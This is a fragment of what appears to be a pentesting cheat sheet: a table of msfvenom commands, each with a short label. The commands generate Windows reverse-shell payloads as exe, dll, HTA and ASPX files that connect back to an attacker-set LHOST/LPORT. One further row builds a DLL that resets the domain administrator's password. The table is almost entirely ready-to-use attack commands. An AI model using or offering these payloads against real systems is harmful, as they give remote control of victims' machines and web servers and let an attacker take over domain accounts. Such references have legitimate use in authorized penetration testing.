...
|    msfvenom -p   windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe >   shell.exe |  Windows Meterpreter reverse shell x64
...
|    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe                                                                                                   |    Windows CMD Single Stage x64                                |
|    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT   -f dll >  shell.dll                                                                                                     |    Windows CMD Single Stage x64 dll                                    |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta                                                                                                         |    HTA malicious file                                     |
...
|    msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx                                                                                                 |    ASP x64 reverse shell                                      |
|    msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx                                                                                                     |    ASP reverse shell                                           |
...
|    msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll                                                                                    |    Windows Exec DA Command x64 dll   |
